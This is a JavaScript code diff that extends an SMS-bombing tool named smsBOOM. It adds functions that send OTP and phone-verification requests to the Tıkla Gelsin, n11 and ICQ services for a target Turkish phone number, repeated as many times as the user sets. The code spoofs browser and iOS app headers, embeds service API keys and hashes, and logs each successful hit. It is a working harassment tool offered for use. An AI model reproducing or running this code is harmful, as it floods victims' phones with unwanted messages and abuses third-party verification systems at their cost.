@@ -365,6 +365,71 @@ async function smsBOOM(numara, miktar) {
         });
     }
 
+    function tiklagelsin(no) {
+		request("https://www.tiklagelsin.com/user/graphql", {
+		  "headers": {
+			"accept": "*/*",
+			"accept-language": "tr,tr-TR;q=0.9,en-US;q=0.8,en;q=0.7",
+			"content-type": "application/json",
+			"sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
+			"sec-ch-ua-mobile": "?0",
+			"sec-ch-ua-platform": "\"Windows\"",
+			"sec-fetch-dest": "empty",
+			"sec-fetch-mode": "cors",
+			"sec-fetch-site": "same-origin",
+			"x-device-type": "3",
+			"x-merchant-type": "0",
+			"x-no-auth": "true",
+			"Referer": "https://www.tiklagelsin.com/a/",
+			"Referrer-Policy": "strict-origin-when-cross-origin"
+		  },
+		  "body": `{\"operationName\":\"GENERATE_OTP\",\"variables\":{\"phone\":\"+90${no}",\"challenge\":\"85033055-4b81-4f6f-aed2-4a8ee1dce968\",\"deviceUniqueId\":\"web_6f59c0e5-3a0a-4bd3-907d-3cd973152333\"},\"query\":\"mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\\n  generateOtp(\\n    phone: $phone\\n    challenge: $challenge\\n    deviceUniqueId: $deviceUniqueId\\n  )\\n}\\n\"}`,
+		  "method": "POST"
+		}, function (err, httpResponse, body) {
+            if (httpResponse?.statusCode == 200) {
+                dataFSms.basarili++;
+                console.log(`[+] Tıkla Gelsin - ${no} - ${dataFSms.basarili}`.green);
+            } else {
+                dataFSms.hatali++;
+                console.log(`[-] Tıkla Gelsin - ${no} - ${dataFSms.hatali}`.red);
+            }
+           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
+        });
+	}
+
+    function n11(no) {
+        request.post({
+            url: 'https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3',          
+            headers: {"Mobileclient": "IOS", "Content-Type": "application/json", "Accept": "*/*", "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F", "Clientversion": "163", "Accept-Encoding": "gzip, deflate", "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Connection": "close"},
+            json: {"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": faker.internet.email(), "gsmNumber": no, "userType": "BUYER"}           
+        }, function (err, httpResponse, body) {
+            if (httpResponse?.statusCode == 200) {
+                dataFSms.basarili++;
+                console.log(`[+] N11 - ${no} - ${dataFSms.basarili}`.green);
+            } else {
+                dataFSms.hatali++;
+                console.log(`[-] N11 - ${no} - ${dataFSms.hatali}`.red);
+            }
+           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
+        });
+    }
+
+    function icq(no) {
+        request.post({
+            url: `https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90${no}&platform=ios&r=796356153&smsFormatType=human`,
+            headers: {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
+        }, function (err, httpResponse, body) {
+            if (httpResponse?.statusCode == 200) {
+                dataFSms.basarili++;
+                console.log(`[+] İcq - ${no} - ${dataFSms.basarili}`.green);
+            } else {
+                dataFSms.hatali++;
+                console.log(`[-] İcq - ${no} - ${dataFSms.hatali}`.red);
+            }
+           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
+        });
+    }
+
     function send(no) {
         rentiva(no);
         tazi(no);
@@ -384,6 +449,9 @@ async function smsBOOM(numara, miktar) {
         total(no);
         arasta360(no);
         alibaba(no);
+        tiklagelsin(no);
+        n11(no);
+        icq(no);
     }
 
     for (let i = 0; i < miktar; i++) {
